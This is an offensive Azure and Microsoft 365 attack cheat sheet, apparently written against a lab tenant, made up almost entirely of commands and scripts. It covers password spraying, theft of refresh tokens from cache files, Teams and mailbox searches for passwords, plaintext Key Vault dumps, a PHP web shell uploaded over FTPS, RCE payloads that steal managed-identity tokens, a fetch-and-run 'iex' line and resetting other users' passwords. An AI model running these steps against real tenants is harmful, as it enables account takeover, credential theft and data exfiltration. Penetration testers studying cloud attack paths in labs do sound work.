## Refresh Tokens
Look for service principals and perform password spraying
```
az ad user list --query "[].userPrincipalName" --output tsv}
python3 o365spray.py --spray -U users.txt -P pass.txt --lockout 5 --domain megabigtech.com
```
Get Access Token
```
az account get-access-token 
az account get-access-token --resource "https://vault.azure.net"
(Get-AzAccessToken -ResourceUrl "https://vault.azure.net/").Token
(Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com/").Token
```
Obtain refresh token from files
```
Linux and Mac
 ~/.azure/msal_token_cache.json
 
Windows
%userprofile%\.azure\msal_token_cache.bin
```
Install old version az cli
```
Invoke-WebRequest -Uri https://azurecliprod.blob.core.windows.net/msi/azure-cli-2.3.0.msi -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi
```
Impersonate valid session
```
Select-AzContext
```
Get Refresh Tokens with Graphrunner
```
Get-GraphTokens
Get-GraphTokens –Device AndroidMobile  #using a MobileDevice
```
Get Refresh Token with Token Tactics v2
```
Import-Module .\TokenTactics.psm1
Get-Help Invoke-RefreshToMSGraphToken -Examples
Get-AzureToken -Client MSGraph
Invoke-RefreshToMSGraphToken -domain megabigtech.com -refreshToken "<token>"
$MSGraphToken.access_token
```
Dump Conditional Access Policies
```
roadrecon plugin policies; firefox ./caps.html
curl -sSf -H "Authorization: Bearer $token" 'https://graph.microsoft.com/beta/identity/conditionalaccess/policies' | jq
```
Get authentication tokens from active session
```
roadrecon auth -u "user@domain.com" -p 'password'
roadrecon auth --device-code
```
Gather Information from Entra ID
```
roadrecon gather
```
Dump conditional policies
```
roadrecon plugin policies
```
Transfer data to bloodhound
```
roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp password
```
Visually examine Azure environment
```
roadrecon gui
```

## Microsoft 365 Lateral Movement 

### AADInternals
Get Teams Messages
```
$tokens.refresh_token
RefreshTo-MSTeamsToken -domain megabigtech.com -RefreshToken 0.A…
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | fl id,content,deletiontime,*type*,DisplayName
```

### GraphRunner
Get information from Office365 licenses
```
curl https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') |iex
```
List GraphRunner Modules
```
List-GraphRunnerModules
```
List information from SharePoint and OneDrive
```
Get-Help Invoke-SearchSharePointAndOneDrive -examples
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
```
Get Information from teams
```
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```


## Exfiltrate Email information
Exfiltrate email
```
#Need an access token
python3 ./exfil_exchange_mail.py
```
Get information from email with GraphRunner
```
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```

## Key Vault
Read Key Vault Powershell 5
```
$secrets = Get-AzKeyVaultSecret -VaultName "MYVAULT"

foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    
    $secretValue = Get-AzKeyVaultSecret -VaultName "MYVAULT" -Name $secret.Name
    $secretValueSecureString = $secretValue.SecretValue
    
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValueSecureString)
    $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```

Read key Vault powershell 7 and above
```
$secrets = Get-AzKeyVaultSecret -VaultName "MYVAULT"

foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    $secretValue = Get-AzKeyVaultSecret -VaultName "MYVAULT" -Name $secret.Name
    $secretValueText = $secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText
    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```

## Database Retrieval
Interact with Database using Powershell
Connect to the database
```
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='PASSWORD'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=USERID;Password=$password;"
$conn.Open()
```
Inspect databases
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```
Inspect tables
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM Subscribers;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft
```
Finish connection to database
```
$conn.Close()
```
Get database connection using Vscode 
```
#Add MSSQL extensions and add connection string
Server=mbt-finance.database.windows.net;Database=Finance;User ID=USERID;Password=$password;
```
Database enumeration with sqlcmd
```
#Only if the tool is installed
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'PASSWORD' -d DATABASE -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'PASSWORD' -d DATABASE -Q "SELECT * FROM TABLENAME"
```

## kudu

## SFTP/FTPS
Exfiltrate webapp publishing profile
```
Note: Require Website Contributor Role

$webAppName = "megabigtech-hr-portal"
$resourceGroupName = "mbt-rg-12"

$publishingProfileXml = [xml](Get-AzWebAppPublishingProfile -Name $webAppName -ResourceGroupName $resourceGroupName -OutputFile null)

$username = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userName
$password = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userPWD
$ftpsProfile = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='FTP']")
$ftpsUrl = $ftpsProfile.publishUrl

$username
$password
$ftpsUrl
```
Transfer files to FTPS
```
#shell.php
<?php echo system($_GET["c"]); ?>

#curl command
curl -T shell.php --ssl ftps://FTPSURL/site/wwwroot/portal/shell.php --user '$user-hr-portal'
```
Identify Managed Identity in environment variables
```
http://169.254.129.5:8081/msi/token
IDENTITY_HEADER
IDENTITY_ENDPOINT
```
Leverage RCE to obtain Azure Resource Manager API access token
```
?c=curl%20-s%20-H%20%22X-Identity-Header%3A%20559e4333-f593-4735-8684-9742cc817930%22%20%22http%3A%2F%2F169.254.129.5%3A8081%2Fmsi%2Ftoken%3Fapi-version%3D2019-08-01%26resource%3Dhttps%3A%2F%2Fmanagement.azure.com%2F%22
```
Leverage RCE to obtain Microsoft Graph API access token
```
?c=curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "http://169.254.129.X:8081/msi/token?api-version=2019-08-01&resource=https://management.azure.com/"
```

List Azure management Resources
```
$subscriptionId = "SUBSCRIPTIONID"

# Azure Management API URL to list resources
$url = "https://management.azure.com/subscriptions/$subscriptionId/resources?api-version=2021-04-01"

# Headers with the access token for authorization
$headers = @{
    Authorization = "Bearer $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
    $resources = $response.value
    # Output the resources
    $resources | ForEach-Object {
        Write-Output "Resource Name: $($_.name), Type: $($_.type), Location: $($_.location)"
    }
} catch {
    Write-Error "Failed to retrieve resources: $_"
}
```

List Administrative Units using Microsoft Graph Token

```
$headers = @{
    Authorization = "Bearer $token"
    "Content-Type" = "application/json"
}

$graphUrl = "https://graph.microsoft.com/v1.0/directory/administrativeUnits"

try {
    $adminUnits = Invoke-RestMethod -Uri $graphUrl -Headers $headers -Method Get
    # Output the administrative units
    $adminUnits.value | ForEach-Object {
        Write-Output "ID: $($_.id) - Display Name: $($_.displayName)"
    }
} catch {
    Write-Error "Error accessing Microsoft Graph: $_"
}
```
List Administrative Units members
```
$auId = "ADMINISTRATIVE_UNIT_ID"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}
$urlUsers = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/$auId/members/microsoft.graph.user"

$responseUsers = Invoke-RestMethod -Uri $urlUsers -Headers $headers -Method Get
$responseUsers.value
```
List Administrative Units permissions
```
$adminUnitId = "ADMINISTRATIVE_UNIT_ID"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$url = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/$adminUnitId/scopedRoleMembers"
$response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
$response.value | fl
```
Resolve ID to role and description
```
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$roleIds = @("ROLEID")

foreach ($roleId in $roleIds) {
    $url = "https://graph.microsoft.com/v1.0/directoryRoles?`$filter=id eq '$roleId'"
    $roleDetails = Invoke-RestMethod -Uri $url -Headers $headers -Method Get

    if ($roleDetails.value.Count -gt 0) {
        foreach ($role in $roleDetails.value) {
            Write-Host "Role ID: $($role.id)"
            Write-Host "Display Name: $($role.displayName)"
            Write-Host "Description: $($role.description)"
            Write-Host "----------------------"
        }
    }
    else {
        Write-Host "No details found for Role ID: $roleId"
    }
}
```
Update password of other user using Password Administrator role
```
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$body = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "MYPREFERREDPASSWORD"
    }
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/USERID" -Headers $headers -Method PATCH -Body $body
```

## User Permisions
Add user to a group

```
Add-AzADGroupMember -TargetGroupObjectId $TARGETGROUPOID -MemberObjectId $MEMBEROID
```
